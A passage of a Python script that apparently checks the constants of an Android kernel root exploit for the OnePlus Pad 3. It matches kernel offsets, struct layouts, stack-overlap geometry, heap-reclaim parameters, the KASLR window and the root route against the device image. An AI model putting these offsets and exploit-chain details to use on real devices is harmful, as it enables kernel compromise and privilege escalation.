            failures.append("rt_mutex_setprio donor-identity fixture escaped")
    random_init = disassembly(vmlinux, objdump, "random_sysctls_init")
    ordered_disassembly_contract(
        random_init,
        [
            "adrp x1, 0xffffffc082239000",
            "add x1, x1, #0x320",
            "mov w3, #0x7",
            "bl 0xffffffc081d1b870 <__register_sysctl_init>",
        ],
        "random_table exact registration",
        failures,
    )
    register_table = disassembly(vmlinux, objdump, "__register_sysctl_table")
    ordered_disassembly_contract(
        register_table,
        [
            "mov x23, x2",
            "str x23, [x19]",
            "str x23, [x19, #0x20]",
        ],
        "sysctl registration retains live ctl_table pointer",
        failures,
    )
    proc_call = disassembly(vmlinux, objdump, "proc_sys_call_handler")
    ordered_disassembly_contract(
        proc_call,
        [
            "ldr x23, [x8, #0xb8]",
            "ldr x8, [x23, #0x20]",
            "mov x0, x23",
            "blr x8",
        ],
        "proc sysctl handler receives live ctl_table entry",
        failures,
    )

    route_errors = slide_source_contract_errors(
        route, expected_qword1=uuid_slot_alias
    )
    failures.extend(f"slide profile contract: {error}" for error in route_errors)
    restore = route.get("restore_contract")
    if isinstance(restore, dict):
        restore_values = {
            "uuid_data_before": nfulnl_alias,
            "uuid_data_after": 0,
            "nfulnl_type_qword_before": uuid_slot_alias,
            "nfulnl_type_qword_after": type_qword,
            "nfulnl_logfn_expected_rva": logfn_rva,
        }
        for key, expected in restore_values.items():
            try:
                actual = profile_int(restore, key)
            except (KeyError, ValueError):
                failures.append(f"slide restore_contract.{key} is invalid")
                continue
            if actual != expected:
                failures.append(
                    f"slide restore_contract.{key}=0x{actual:x}, expected=0x{expected:x}"
                )

    sources = load_pad3_sources(clang)
    failures.extend(
        f"Pad 3 UUID C source contract: {error}"
        for error in pad3_uuid_source_contract_errors(sources)
    )
    source_fixtures = run_pad3_uuid_source_negative_fixtures(sources)
    data_fixtures = run_slide_contract_negative_fixtures(
        route,
        expected_qword1=uuid_slot_alias,
        direct_map_start=defines["DIRECT_MAP_BASE"],
        direct_map_end=defines["DIRECT_MAP_END"],
        name_rva=name_rva,
        kimage_base=base,
        kaslr_min=defines["SLIDE_KASLR_MIN"],
        kaslr_max=defines["SLIDE_KASLR_MAX"],
        kaslr_align=defines["SLIDE_KASLR_ALIGN"],
        old_boot_id_alias=boot_slot_alias,
    )
    print(
        f"SLIDE     uuid.slot={uuid_slot:#x} nfulnl={nfulnl_rva:#x} "
        f"name={name_rva:#x} type={type_qword_rva:#x} logfn={logfn_rva:#x} "
        f"qword1={uuid_slot_alias:#x} fixtures={source_fixtures + data_fixtures} OK"
    )
    quality_evidence_path = TARGET / "kernelsnitch-quality-evidence.json"
    quality_evidence = json.loads(
        quality_evidence_path.read_text(encoding="utf-8")
    )
    quality_sha = sha256(quality_evidence_path)
    diagnostic_profile = profile.get("kernelsnitch_diagnostics")
    diagnostic_errors = pad3_kernelsnitch_diagnostic_contract_errors(
        sources, diagnostic_profile, quality_evidence, quality_sha
    )
    failures.extend(
        f"Pad 3 KernelSnitch diagnostic C/profile/evidence contract: {error}"
        for error in diagnostic_errors
    )
    diagnostic_fixtures = 0
    if not diagnostic_errors:
        diagnostic_fixtures = run_pad3_kernelsnitch_diagnostic_negative_fixtures(
            sources, diagnostic_profile, quality_evidence, quality_sha
        )
    print(
        "KS-DIAG   per-stage stats diagnostic-only no-route-gate "
        "waiter-ready=4096/exact "
        f"fixtures={diagnostic_fixtures} OK"
    )
    evidence_path = TARGET / "reclaim-evidence.json"
    evidence = json.loads(evidence_path.read_text(encoding="utf-8"))
    reclaim = profile.get("reclaim_hardening")
    reclaim_errors = pad3_reclaim_source_contract_errors(
        sources, reclaim, evidence
    )
    failures.extend(
        f"Pad 3 reclaim C/profile/evidence contract: {error}"
        for error in reclaim_errors
    )
    reclaim_fixtures = 0
    if not reclaim_errors:
        reclaim_fixtures = run_pad3_reclaim_negative_fixtures(
            sources, reclaim, evidence
        )
    print(
        "RECLAIM   sends=4 truesize=0x9100 min-sndbuf=0x24401 "
        "head-guard-groups=1 total=8/4/4 per-group=8/4/4 "
        "slab=8x4K/order3 "
        f"fixtures={reclaim_fixtures} OK"
    )
    mode4_route = profile.get("fops_mode4_route")
    mode4_errors = pad3_mode4_source_contract_errors(sources, mode4_route)
    failures.extend(
        f"Pad 3 mode4 C/profile contract: {error}" for error in mode4_errors
    )
    model_errors = mode4_rb_erase_case1_errors(positive_mode4_shape())
    failures.extend(f"Pad 3 mode4 rb_erase model: {error}" for error in model_errors)
    mode4_source_fixtures = 0
    if not mode4_errors:
        mode4_source_fixtures = run_pad3_mode4_source_negative_fixtures(
            sources, mode4_route
        )
    mode4_model_fixtures = run_mode4_model_negative_fixtures()
    print(
        "MODE4     owner=0 target=fake_fops collateral=llseek "
        "cached-root=0 donor=canonical-init_task "
        f"fixtures={mode4_source_fixtures + mode4_model_fixtures} OK"
    )


def find_objdump(explicit: str | None) -> str:
    if explicit:
        return explicit
    found = shutil.which("llvm-objdump")
    if found:
        return found
    ndk = os.environ.get("ANDROID_NDK_HOME")
    if ndk:
        candidate = Path(ndk) / "toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-objdump"
        if candidate.is_file():
            return str(candidate)
    candidates = sorted(
        (Path.home() / "Android/Sdk/ndk").glob(
            "*/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-objdump"
        )
    )
    if candidates:
        return str(candidates[-1])
    raise RuntimeError("llvm-objdump not found; pass --objdump")


def find_clang(explicit: str | None) -> str:
    if explicit:
        return explicit
    ndk = os.environ.get("ANDROID_NDK_HOME")
    if ndk:
        candidate = (
            Path(ndk)
            / "toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
        )
        if candidate.is_file():
            return str(candidate)
    candidates = sorted(
        (Path.home() / "Android/Sdk/ndk").glob(
            "*/toolchains/llvm/prebuilt/linux-x86_64/bin/"
            "aarch64-linux-android35-clang"
        )
    )
    if candidates:
        return str(candidates[-1])
    found = shutil.which("clang")
    if found:
        return found
    raise RuntimeError("clang not found; pass --clang")


def preprocess_pad3_source(path: Path, clang: str) -> str:
    """Resolve conditionals and strip comments without expanding route macros."""

    return run(
        [
            clang,
            "-E",
            "-P",
            "-fdirectives-only",
            "-Werror=macro-redefined",
            f'-DTARGET_HEADER="{TARGET_INCLUDE}"',
            f'-DTARGET_CONFIG_H="{TARGET_INCLUDE}"',
            f'-DTARGET_KERNEL_RELEASE="{KERNEL_RELEASE}"',
            "-I",
            str(CORE66),
            "-I",
            str(PAYLOAD),
            "-I",
            str(TARGET),
            "-I",
            str(ROOT / "src"),
            str(path),
        ]
    )


def load_pad3_sources(clang: str) -> dict[str, str]:
    paths = {
        "common": CORE66 / "common.h",
        "slide": CORE66 / "slide.c",
        "util": CORE66 / "util.c",
        "fops": CORE66 / "fops.c",
        "pipe": CORE66 / "pipe.c",
        "main": CORE66 / "main.c",
        "root": CORE66 / "root.c",
        "preload": PAYLOAD / "preload.c",
    }
    sources = {
        name: preprocess_pad3_source(path, clang) for name, path in paths.items()
    }
    # Raw copies let target-scope checks prove the legacy defaults still exist;
    # preprocessing correctly removes those #ifndef branches for Pad 3.
    sources["common_raw"] = (CORE66 / "common.h").read_text(encoding="utf-8")
    sources["slide_raw"] = (CORE66 / "slide.c").read_text(encoding="utf-8")
    sources["target_raw"] = (TARGET / "target-core66.h").read_text(
        encoding="utf-8"
    )
    sources["pmg_target_raw"] = (
        ROOT / "tools/fixtures/core66-feature-off/target-core66.h"
    ).read_text(encoding="utf-8")
    sources["kernelsnitch_raw"] = (
        CORE66 / "kernelsnitch" / "kernelsnitch.h"
    ).read_text(encoding="utf-8")
    sources["fops_raw"] = (CORE66 / "fops.c").read_text(encoding="utf-8")
    sources["pipe_raw"] = (CORE66 / "pipe.c").read_text(encoding="utf-8")
    sources["main_raw"] = (CORE66 / "main.c").read_text(encoding="utf-8")
    sources["root_raw"] = (CORE66 / "root.c").read_text(encoding="utf-8")
    sources["preload_raw"] = (PAYLOAD / "preload.c").read_text(encoding="utf-8")
    sources["utils_raw"] = (CORE66 / "kernelsnitch" / "utils.h").read_text(
        encoding="utf-8"
    )
    return sources


def disassembly(vmlinux: Path, objdump: str, symbol: str) -> str:
    return run(
        [
            objdump,
            "-d",
            "--no-show-raw-insn",
            f"--disassemble-symbols={symbol}",
            str(vmlinux),
        ]
    )


def frame_size(text: str, symbol: str) -> int:
    match = re.search(r"\bsub\s+sp,\s*sp,\s*#(0x[0-9a-f]+|[0-9]+)", text)
    if not match:
        raise RuntimeError(f"no stack allocation found in {symbol}")
    return int(match.group(1), 0)


def local_sp_offset(text: str, register: str, symbol: str) -> int:
    match = re.search(
        rf"\badd\s+{re.escape(register)},\s*sp,\s*#(0x[0-9a-f]+|[0-9]+)",
        text,
    )
    if not match:
        raise RuntimeError(f"no {register}=sp+local found in {symbol}")
    return int(match.group(1), 0)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    generated = ROOT / "generated/oneplus-pad-3"
    parser.add_argument("--kernel", type=Path, default=generated / "kernel")
    parser.add_argument("--vmlinux", type=Path, default=generated / "vmlinux")
    parser.add_argument(
        "--symvers", type=Path, default=generated / "Module.symvers"
    )
    parser.add_argument("--btf", type=Path, default=generated / "kernel.btf")
    parser.add_argument("--kallsyms", type=Path, default=generated / "kallsyms.txt")
    parser.add_argument("--nm", default=shutil.which("nm") or "nm")
    parser.add_argument("--bpftool", default=shutil.which("bpftool") or "bpftool")
    parser.add_argument("--objdump")
    parser.add_argument("--clang")
    parser.add_argument(
        "--mode4-contract-self-test",
        action="store_true",
        help="run only the read-only mode4/profile/source negative fixtures",
    )
    parser.add_argument(
        "--reclaim-contract-self-test",
        action="store_true",
        help="run only the read-only reclaim/profile/evidence negative fixtures",
    )
    args = parser.parse_args()

    if args.mode4_contract_self_test:
        clang = find_clang(args.clang)
        profile = json.loads((TARGET / "profile.json").read_text(encoding="utf-8"))
        route = profile.get("fops_mode4_route")
        sources = load_pad3_sources(clang)
        errors = pad3_mode4_source_contract_errors(sources, route)
        errors.extend(mode4_rb_erase_case1_errors(positive_mode4_shape()))
        if errors:
            for error in errors:
                print(f"FAIL      {error}", file=sys.stderr)
            return 1
        source_count = run_pad3_mode4_source_negative_fixtures(sources, route)
        model_count = run_mode4_model_negative_fixtures()
        print(
            "MODE4     source/profile/model negative fixtures="
            f"{source_count + model_count} OK"
        )
        return 0

    if args.reclaim_contract_self_test:
        clang = find_clang(args.clang)
        profile = json.loads((TARGET / "profile.json").read_text(encoding="utf-8"))
        quality_evidence_path = TARGET / "kernelsnitch-quality-evidence.json"
        quality_evidence = json.loads(
            quality_evidence_path.read_text(encoding="utf-8")
        )
        evidence = json.loads(
            (TARGET / "reclaim-evidence.json").read_text(encoding="utf-8")
        )
        sources = load_pad3_sources(clang)
        diagnostic_profile = profile.get("kernelsnitch_diagnostics")
        quality_sha = sha256(quality_evidence_path)
        diagnostic_errors = pad3_kernelsnitch_diagnostic_contract_errors(
            sources, diagnostic_profile, quality_evidence, quality_sha
        )
        if diagnostic_errors:
            for error in diagnostic_errors:
                print(f"FAIL      {error}", file=sys.stderr)
            return 1
        diagnostic_fixture_count = run_pad3_kernelsnitch_diagnostic_negative_fixtures(
            sources, diagnostic_profile, quality_evidence, quality_sha
        )
        print(
            "KS-DIAG    target-only diagnostic/no-gate waiter-ready "
            "negative fixtures="
            f"{diagnostic_fixture_count} OK"
        )
        reclaim = profile.get("reclaim_hardening")
        errors = pad3_reclaim_source_contract_errors(sources, reclaim, evidence)
        if errors:
            for error in errors:
                print(f"FAIL      {error}", file=sys.stderr)
            return 1
        fixture_count = run_pad3_reclaim_negative_fixtures(
            sources, reclaim, evidence
        )
        print(
            "RECLAIM   source/profile/evidence/model negative fixtures="
            f"{fixture_count} OK"
        )
        return 0

    for path in (args.kernel, args.vmlinux, args.symvers, args.btf, args.kallsyms):
        if not path.is_file():
            parser.error(f"missing generated input: {path}")

    clang = find_clang(args.clang)
    defines = parse_defines(clang)
    symbols = parse_symbols(args.vmlinux, args.nm)
    kallsyms_symbols = parse_kallsyms(args.kallsyms)
    base = symbols.get("_text")
    if base != defines.get("KIMAGE_TEXT_BASE"):
        raise RuntimeError(
            f"_text mismatch: vmlinux={base!r} header={defines.get('KIMAGE_TEXT_BASE')!r}"
        )

    failures: list[str] = []
    source_contract = subprocess.run(
        [sys.executable, str(ROOT / "tools/verify-a3-source-contract.py")],
        check=False,
        capture_output=True,
        text=True,
    )
    if source_contract.stdout:
        print(source_contract.stdout.strip())
    if source_contract.returncode != 0:
        failures.append(
            "A3 source contract failed: " + source_contract.stderr.strip()
        )
    for define, (symbol, delta) in SYMBOLS.items():
        actual = symbols.get(symbol)
        if actual is None:
            failures.append(f"missing kallsyms symbol: {symbol}")
            continue
        expected = actual - base + delta
        if defines.get(define) != expected:
            failures.append(
                f"{define}: header=0x{defines.get(define, -1):x} extracted=0x{expected:x}"
            )

    btf_raw = run([args.bpftool, "btf", "dump", "file", str(args.btf), "format", "raw"])
    structs = parse_btf(btf_raw)
    enums = parse_btf_enums(btf_raw)
    for struct_name, mapping in BTF_FIELDS.items():
        size, fields = choose_struct(structs, struct_name, set(mapping))
        if struct_name == "task_struct" and fields.get("stack") != 0x38:
            failures.append(
                f"exact task_struct.stack={fields.get('stack')!r}, expected=0x38"
            )
        if struct_name == "rt_mutex_waiter" and size != 0x70:
            failures.append(
                f"exact sizeof(rt_mutex_waiter)=0x{size:x}, expected=0x70"
            )
        for field, define in mapping.items():
            actual = fields[field]
            if define == "ASHMEM_MISCDEVICE_FOPS_BTF":
                if actual != 0x10:
                    failures.append(f"miscdevice.fops: extracted=0x{actual:x}, expected=0x10")
                continue
            if defines.get(define) != actual:
                failures.append(
                    f"{define}: header=0x{defines.get(define, -1):x} "
                    f"BTF {struct_name}.{field}=0x{actual:x}"
                )
        print(f"BTF       {struct_name:<22} size=0x{size:x} fields={len(mapping)} OK")

    reclaim_btf_sizes = {
        "skb_shared_info": 0x168,
        "sk_buff": 0xF0,
    }
    for struct_name, expected_size in reclaim_btf_sizes.items():
        size, _ = choose_struct(structs, struct_name, set())
        if size != expected_size:
            failures.append(
                f"reclaim BTF sizeof({struct_name})=0x{size:x}, "
                f"expected=0x{expected_size:x}"
            )
    print("BTF       reclaim skb_shared_info=0x168 sk_buff=0xf0 OK")

    kernel_config = TARGET / "kernel.config"
    expected_config_hash = (
        "032ff35b6657c91047c93090a1884993ca622d0720fc2bb772a7ef0558c3fb7e"
    )
    if sha256(kernel_config) != expected_config_hash:
        failures.append("Pad 3 kernel.config hash is not the exact extracted IKCONFIG")
    config_text = kernel_config.read_text(encoding="utf-8")
    for setting in (
        "CONFIG_MEMCG=y",
        "CONFIG_MEMCG_KMEM=y",
        "CONFIG_SLUB=y",
        "CONFIG_SLUB_CPU_PARTIAL=y",
        "# CONFIG_RANDOM_KMALLOC_CACHES is not set",
    ):
        if re.search(rf"^{re.escape(setting)}$", config_text, re.MULTILINE) is None:
            failures.append(f"Pad 3 reclaim config omits {setting}")
    print("CONFIG    memcg-kmem+SLUB exact; random kmalloc caches disabled OK")

    objdump = find_objdump(args.objdump)
    pselect_sys = disassembly(args.vmlinux, objdump, "__arm64_sys_pselect6")
    select_core = disassembly(args.vmlinux, objdump, "core_sys_select")
    futex_sys = disassembly(args.vmlinux, objdump, "__arm64_sys_futex")
    do_futex = disassembly(args.vmlinux, objdump, "do_futex")
    futex_wait = disassembly(args.vmlinux, objdump, "futex_wait_requeue_pi")
    stack_fds = (
        -frame_size(pselect_sys, "__arm64_sys_pselect6")
        - frame_size(select_core, "core_sys_select")
        + local_sp_offset(select_core, "x20", "core_sys_select")
    )
    waiter = (
        -frame_size(futex_sys, "__arm64_sys_futex")
        - frame_size(do_futex, "do_futex")
        - frame_size(futex_wait, "futex_wait_requeue_pi")
        + local_sp_offset(futex_wait, "x27", "futex_wait_requeue_pi")
    )
    waiter_word = (waiter - stack_fds) // 8
    if stack_fds != waiter or waiter_word != 0:
        failures.append(
            f"pselect overlap: stack_fds={stack_fds:#x} waiter={waiter:#x} word={waiter_word}"
        )
    if defines.get("PSELECT_WAITER_WORD_SHIFT") != waiter_word - 2:
        failures.append("PSELECT_WAITER_WORD_SHIFT does not match exact frame geometry")
    if defines.get("SLIDE_PSELECT_WORD_SHIFT") != waiter_word:
        failures.append("SLIDE_PSELECT_WORD_SHIFT does not match exact frame geometry")
    exact_mode4_defines = {
        "P0_DISABLE_RUNTIME_PSELECT_LAYOUT_OVERRIDE": 1,
        "DIRECT_WAITER_PI_CLEANUP": 1,
        "TASK_STACK_OFF": 0x38,
        "TASK_THREAD_SIZE": 0x4000,
        "RT_MUTEX_WAITER_SIZE": 0x70,
        "SKB_RECLAIM_PAD3_HARDENING": 1,
        "SKB_RECLAIM_SENDS": 4,
        "SKB_RECLAIM_SHINFO_SIZE": 0x168,
        "SKB_RECLAIM_SHINFO_ALIGNED": 0x180,
        "SKB_RECLAIM_SKB_ALIGNED": 0x100,
        "SKB_RECLAIM_MAX_HEAD": 0xE80,
        "SKB_RECLAIM_HEAD_ONLY_SIZE": 0xE80,
        "SKB_RECLAIM_TRUESIZE": 0x9100,
        "SKB_RECLAIM_MIN_EFFECTIVE_SNDBUF": 0x24401,
        "SKB_HEAD_GUARD_SLAB_ORDER": 3,
        "SKB_HEAD_GUARD_SLAB_OBJECTS": 8,
        "SKB_HEAD_GUARD_GROUPS": 1,
        "SKB_HEAD_GUARD_SENDS": 8,
        "SKB_HEAD_GUARD_FREES": 4,
        "SKB_HEAD_GUARD_HOLDERS": 4,
        "PSELECT_EXPECTED_READY": 8,
        "PAD3_KERNELSNITCH_DIAGNOSTICS": 1,
        "PAD3_KERNELSNITCH_READY_BARRIER": 1,
        "PAD3_KERNELSNITCH_READY_TIMEOUT_MS": 10000,
        "PAD3_KERNELSNITCH_CHILD_START_BARRIER": 1,
        "PAD3_KERNELSNITCH_CHILD_START_TIMEOUT_MS": 10000,
    }
    for define, expected in exact_mode4_defines.items():
        if defines.get(define) != expected:
            failures.append(
                f"{define}: header={defines.get(define)!r}, expected=0x{expected:x}"
            )
    print(
        f"STACK     stack_fds={stack_fds:#x} waiter={waiter:#x} "
        f"word={waiter_word} fops_shift={defines.get('PSELECT_WAITER_WORD_SHIFT')}"
    )

    profile = json.loads((TARGET / "profile.json").read_text(encoding="utf-8"))
    hashes = profile["artifacts"]
    for key, path in (
        ("kernel_sha256", args.kernel),
        ("vmlinux_sha256", args.vmlinux),
        ("module_symvers_sha256", args.symvers),
        ("btf_sha256", args.btf),
        ("kallsyms_sha256", args.kallsyms),
    ):
        actual = sha256(path)
        if hashes.get(key) != actual:
            failures.append(f"{key}: profile={hashes.get(key)} actual={actual}")
    if hashes.get("ikconfig_sha256") != sha256(kernel_config):
        failures.append("profile IKCONFIG hash does not match target kernel.config")
    reclaim_profile = profile.get("reclaim_hardening")
    evidence_path = TARGET / "reclaim-evidence.json"
    if not isinstance(reclaim_profile, dict):
        failures.append("profile reclaim_hardening object is missing")
    elif reclaim_profile.get("evidence_sha256") != sha256(evidence_path):
        failures.append("profile reclaim evidence hash does not match evidence file")
    quality_profile = profile.get("kernelsnitch_diagnostics")
    quality_evidence_path = TARGET / "kernelsnitch-quality-evidence.json"
    if not isinstance(quality_profile, dict):
        failures.append("profile kernelsnitch_diagnostics object is missing")
    elif quality_profile.get("evidence_sha256") != sha256(quality_evidence_path):
        failures.append(
            "profile KernelSnitch quality evidence hash does not match evidence file"
        )
    pselect_profile = profile.get("pselect")
    if not isinstance(pselect_profile, dict) or (
        pselect_profile.get("expected_ready_diagnostic") != 8
        or pselect_profile.get("expected_ready_is_success_gate") is not False
    ):
        failures.append("Pad 3 expected-ready value is not diagnostic-only exact 8")

    physical = profile["physical_layout"]
    if defines.get("P0_PHYS_OFFSET") != int(physical["phys_offset"], 0):
        failures.append("P0_PHYS_OFFSET does not match profile physical layout")
    if defines.get("P0_KERNEL_PHYS_LOAD") != int(
        physical["kernel_phys_load"], 0
    ):
        failures.append("P0_KERNEL_PHYS_LOAD does not match profile physical layout")
    for define, key in (
        ("P0_KERNEL_REGION_START", "kernel_region_start"),
        ("P0_KERNEL_REGION_SIZE", "kernel_region_size"),
        ("P0_KERNEL_IMAGE_SIZE", "kernel_image_size"),
    ):
        if defines.get(define) != int(physical[key], 0):
            failures.append(f"{define} does not match profile physical layout")
    region_start = int(physical["kernel_region_start"], 0)
    region_size = int(physical["kernel_region_size"], 0)
    image_size = int(physical["kernel_image_size"], 0)
    kernel_load = int(physical["kernel_phys_load"], 0)
    if not (
        region_size > 0
        and image_size > 0
        and image_size <= region_size
        and image_size >= args.kernel.stat().st_size
        and region_start <= kernel_load
        and kernel_load + image_size <= region_start + region_size
    ):
        failures.append("kernel physical image bounds escape the committed region")
    if kernel_load & 0x1FFFFF:
        failures.append("kernel physical load is not 2 MiB aligned")

    if defines.get("P0_DISABLE_DIRECT_ROOT_ROUTE") != 1:
        failures.append("P0_DISABLE_DIRECT_ROOT_ROUTE is not enabled for release")
    if defines.get("P0_DISABLE_RAW_WORKQUEUE_ROUTE") != 1:
        failures.append("P0_DISABLE_RAW_WORKQUEUE_ROUTE is not enabled for release")
    unsafe_direct_define = re.compile(
        r"^\s*#\s*define\s+P0_ENABLE_UNSAFE_DIRECT_ROOT_ROUTE\b", re.MULTILINE
    )
    if any(
        unsafe_direct_define.search(path.read_text(encoding="utf-8"))
        for path in TARGET.glob("*.h")
    ):
        failures.append("P0_ENABLE_UNSAFE_DIRECT_ROOT_ROUTE is defined in target headers")
    unsafe_raw_wq_define = re.compile(
        r"^\s*#\s*define\s+P0_ENABLE_UNSAFE_RAW_WQ_ROUTE\b", re.MULTILINE
    )
    if any(
        unsafe_raw_wq_define.search(path.read_text(encoding="utf-8"))
        for path in TARGET.glob("*.h")
    ):
        failures.append("P0_ENABLE_UNSAFE_RAW_WQ_ROUTE is defined in target headers")
    if profile["root_route"].get("fallback") != (
        "disabled-in-release-until-kphys-runtime-readback"
    ):
        failures.append("profile direct-root fallback is not disabled for release")
    if profile["root_route"].get("preferred") != (
        "configfs-pipe-physrw-fcred-stop-pidfd-guardian-legit-commit-sealed-execveat"
    ):
        failures.append("profile does not select exact stopped/f_cred A3")
    if profile["root_route"].get("raw_workqueue_route_in_release") is not False:
        failures.append("profile does not disable the raw workqueue route")
    if profile["root_route"].get("plat_sepolicy_cil_sha256") != (
        "8c2a6cb31d87d70efb3f98760704d8d3f17da32ce75704db27185f314044ac22"
    ):
        failures.append("profile plat_sepolicy.cil hash is not exact OPD2415")
    if profile["root_route"].get("required_kernel_self_process_fork_allow") != (
        "(allow domain self (process (fork sigchld sigkill sigstop signull signal "
        "getsched setsched getsession getpgid getcap setcap getattr setrlimit)))"
    ):
        failures.append("profile kernel self process:fork allow is not exact")
    validations = physical["validation"]
    if defines.get("KPHYS_VALIDATION_COUNT") != len(validations):
        failures.append("KPHYS_VALIDATION_COUNT does not match profile validation list")
    kernel_bytes = args.kernel.read_bytes()
    for index, validation in enumerate(validations):
        offset = int(validation["offset"], 0)
        expected = bytes.fromhex(validation["bytes"])
        actual = kernel_bytes[offset : offset + len(expected)]
        macro_offset = defines.get(f"KPHYS_VALIDATION_{index}_OFFSET")
        macro_value = defines.get(f"KPHYS_VALIDATION_{index}_VALUE")
        macro_size = defines.get(f"KPHYS_VALIDATION_{index}_SIZE")
        if actual != expected:
            failures.append(
                f"KPHYS validation {index}: Image={actual.hex()} profile={expected.hex()}"
            )
        if macro_offset != offset or macro_size != len(expected):
            failures.append(
                f"KPHYS validation {index}: header offset/size does not match profile"
            )
        if macro_value != int.from_bytes(expected, "little"):
            failures.append(
                f"KPHYS validation {index}: header value does not match profile bytes"
            )
    expected_runtime_validation = [
        {
            "address": "nfulnl-name-rodata",
            "offset": "0x0160f939",
            "expected": "0x6e696c74656e666e",
        },
        {
            "address": "nfulnl-name-pointer",
            "offset": "0x02112260",
            "expected": "kaslr-base-plus-0x0160f939",
        },
        {
            "address": "nfulnl-type-qword",
            "offset": "0x02112268",
            "expected": "0x1",
        },
        {
            "address": "nfulnl-logfn-pointer",
            "offset": "0x02112270",
            "expected": "kaslr-base-plus-0x00e5e878",
        },
        {
            "address": "ashmem-fops-open-pointer",
            "offset": "0x012ef8f8",
            "expected": "kaslr-base-plus-0x008bc8e0",
        },
    ]
    if physical.get("runtime_validation") != expected_runtime_validation:
        failures.append("KPHYS live runtime validation descriptors are not exact")
    if defines.get("KPHYS_RUNTIME_LIVE_VALIDATION") != 1:
        failures.append("KPHYS live runtime validation is not enabled")
    if defines.get("KPHYS_NFULNL_NAME_PREFIX_VALUE") != 0x6E696C74656E666E:
        failures.append("KPHYS nfulnl rodata prefix is not exact")
    runtime_derivation = physical.get("runtime_physical_derivation")
    expected_derivation = {
        "stable_reads_each": 2,
        "memstart_addr_offset": "0x0167a548",
        "kimage_vaddr_offset": "0x0167a5f8",
        "kimage_voffset_offset": "0x0167a600",
        "formula": "kimage-vaddr-minus-kimage-voffset",
        "require_memstart": "0x80000000",
        "require_phys_equals_candidate": True,
        "require_region_bounds": True,
        "require_2m_alignment": True,
    }
    if runtime_derivation != expected_derivation:
        failures.append("KPHYS runtime physical derivation contract is not exact")
    for macro, symbol in (
        ("KPHYS_MEMSTART_ADDR_OFF", "memstart_addr"),
        ("KPHYS_KIMAGE_VADDR_OFF", "kimage_vaddr"),
        ("KPHYS_KIMAGE_VOFFSET_OFF", "kimage_voffset"),
    ):
        if symbol not in symbols:
            failures.append(f"KPHYS derivation symbol is missing: {symbol}")
        elif defines.get(macro) != symbols[symbol] - symbols["_text"]:
            failures.append(f"{macro} does not match exact vmlinux {symbol}")
    print(
        f"KPHYS     candidate={physical['kernel_phys_load']} "
        f"region=[{region_start:#x},{region_start + region_size:#x}) "
        f"image={image_size:#x} disk_ranges={len(validations)} "
        f"live_ranges={len(expected_runtime_validation)} pre-write-gated"
    )

    expected_kaslr = {
        "SLIDE_KASLR_MIN": 0x1000000000,
        "SLIDE_KASLR_MAX": 0x2FFFE00000,
        "SLIDE_KASLR_ALIGN": 0x200000,
    }
    for define, expected in expected_kaslr.items():
        if defines.get(define) != expected:
            failures.append(
                f"{define}: header=0x{defines.get(define, -1):x} expected=0x{expected:x}"
            )
    print(
        "KASLR     window=[0x1000000000,0x2fffe00000] align=0x200000 "
        "runtime-leak-required"
    )

    verify_pad3_uuid_slide(
        profile=profile,
        defines=defines,
        symbols=symbols,
        kallsyms_symbols=kallsyms_symbols,
        structs=structs,
        enums=enums,
        image=kernel_bytes,
        base=base,
        vmlinux=args.vmlinux,
        objdump=objdump,
        clang=clang,
        failures=failures,
    )

    if failures:
        for failure in failures:
            print(f"FAIL      {failure}", file=sys.stderr)
        return 1
    print(f"PROFILE   {TARGET.relative_to(ROOT)} exact extraction verified")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, RuntimeError, ValueError, KeyError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(2) from exc
